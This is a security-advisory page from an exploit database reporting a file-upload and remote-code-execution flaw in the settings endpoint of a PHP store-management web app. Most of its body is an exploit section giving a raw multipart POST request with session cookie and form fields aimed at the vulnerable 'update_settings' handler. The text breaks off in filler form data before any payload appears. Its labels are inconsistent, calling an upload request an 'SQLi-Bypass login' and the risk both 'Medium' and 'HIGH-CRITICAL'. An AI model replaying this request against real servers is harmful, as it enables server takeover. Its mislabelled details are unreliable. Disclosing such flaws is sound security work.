---
title: OCLS MSMS-PHP (by: oretnom23 ) v1.0 -Copyright © 2025. All rights reserved.   File Upload-FU and Remote Code Execution-RCE Vul
url: https://cxsecurity.com/issue/WLB-2025010020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-22
fetch_date: 2025-10-06T20:05:57.725192
---

# OCLS MSMS-PHP (by: oretnom23 ) v1.0 -Copyright © 2025. All rights reserved.   File Upload-FU and Remote Code Execution-RCE Vul

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OCLS MSMS-PHP (by: oretnom23 ) v1.0 -Copyright © 2025. All rights reserved. ### File Upload-FU and Remote Code Execution-RCE Vulnerabilities** **2025.01.21**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: OCLS MSMS-PHP (by: oretnom23 ) v1.0 -Copyright © 2025. All rights reserved.
### File Upload-FU and Remote Code Execution-RCE Vulnerabilities
# Author: nu11secur1ty
# Date: 01/15/2025
# Vendor: https://github.com/oretnom23
# Software: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html
# Reference: https://portswigger.net/web-security/file-upload | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
## Description:
The update\_settings app with parameter "cimg" is vulnerable for File Upload and then Remote Code Execution without any execution permission sanitizing.
The attacker can upload absolutely DANGEROUS files on that server and he can destroy it with one click!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- SQLi-Bypass login authentication:
```RCE
POST /pwnedhost/php-ocls/classes/SystemSettings.php?f=update\_settings HTTP/1.1
Host: 192.168.100.45
Cookie: PHPSESSID=fk421742c62350l42lajjv1p7a
Content-Length: 6336
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not\_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: application/json, text/javascript, \*/\*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLoVYEHwi1qVl5nBw
Origin: https://192.168.100.45
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.100.45/pwnedhost/php-ocls/admin/?page=system\_info
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
------WebKitFormBoundaryLoVYEHwi1qVl5nBw
Content-Disposition: form-data; name="name"
Mobile Store Management System - PHP
------WebKitFormBoundaryLoVYEHwi1qVl5nBw
Content-Disposition: form-data; name="short\_name"
MSMS-PHP
------WebKitFormBoundaryLoVYEHwi1qVl5nBw
Content-Disposition: form-data; name="about\_us"
<p style="text-align: center; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; font-family: DauphinPlain; font-size: 70px; line-height: 90px;">About Us</p><hr style="margin: 0px; padding: 0px; clear: both; border-top: 0px; height: 1px; background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0));"><div id="Content" style="margin: 0px; padding: 0px; position: relative;"><div id="bannerL" style="margin: 0px 0px 0px -160px; padding: 0px; position: sticky; top: 20px; width: 160px; height: 10px; float: left; text-align: right; color: rgb(0, 0, 0); font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);"></div><div id="bannerR" style="margin: 0px -160px 0px 0px; padding: 0px; position: sticky; top: 20px; width: 160px; height: 10px; float: right; color: rgb(0, 0, 0); font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);"></div><div class="boxed" style="margin: 10px 28.7969px; padding: 0px; clear: both; color: rgb(0, 0, 0); font-family: "Open Sans", Arial, sans-serif; font-size: 14px; text-align: center; background-color: rgb(255, 255, 255);"><div id="lipsum" style="margin: 0px; padding: 0px; text-align: justify;"></div></div></div><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam non ultrices tortor. Sed at ligula non lectus tempor bibendum a nec ante. Maecenas iaculis vitae nisi eu dictum. Duis sit amet enim arcu. Etiam blandit vulputate magna, non lobortis velit pharetra vel. Morbi sollicitudin lorem sed augue suscipit, eu commodo tortor vulputate. Interdum et malesuada fames ac ante ipsum primis in faucibus. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Praesent eleifend interdum est, at gravida erat molestie in. Vestibulum et consectetur dui, ac luctus arcu. Curabitur et viverra elit. Cras ac eleifend ipsum, ac suscipit leo. Vivamus porttitor ac risus eu ultricies. Morbi malesuada mi vel luctus sagittis. Ut vestibulum porttitor est, id rutrum libero. Mauris at lacus vehicula, aliquam purus quis, pharetra lorem.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Proin consectetur massa ut quam molestie porta. Donec sit amet ligula odio. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Morbi ex sapien, pulvinar ac arcu at, luctus scelerisque nibh. In dolor velit, pellentesque eu blandit a, mollis ac neque. Fusce tortor lectus, aliquam et eleifend id, aliquet ut libero. Nunc scelerisque vulputate turpis quis volutpat. Vivamus malesuada sem in dapibus aliquam. Vestibulum imperdiet, nulla vitae pharetra pretium, magna felis placerat libero, quis tincidunt felis diam nec nisi. Sed scelerisque ullamcorper cursus. Suspendisse posuere, velit nec rhoncus cursus, urna sapien consectetur est, et lacinia odio leo nec massa. Nam vitae nunc vitae tortor vestibulum consequat ac quis risus. Sed finibus pharetra orci, id vehicula tellus eleifend sit amet.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Morbi id ante vel velit mollis egestas. Suspendisse pretium sem urna, vitae placerat turpis cursus faucibus. Ut dignissim molestie blandit. Phasellus pulvinar, eros id ultricies mollis, lectus velit viverra mi, at venenatis velit purus id nisi. Duis eu massa lorem. Curabitur sed nibh felis. Donec faucibus, nulla at faucibus blandit, mi justo...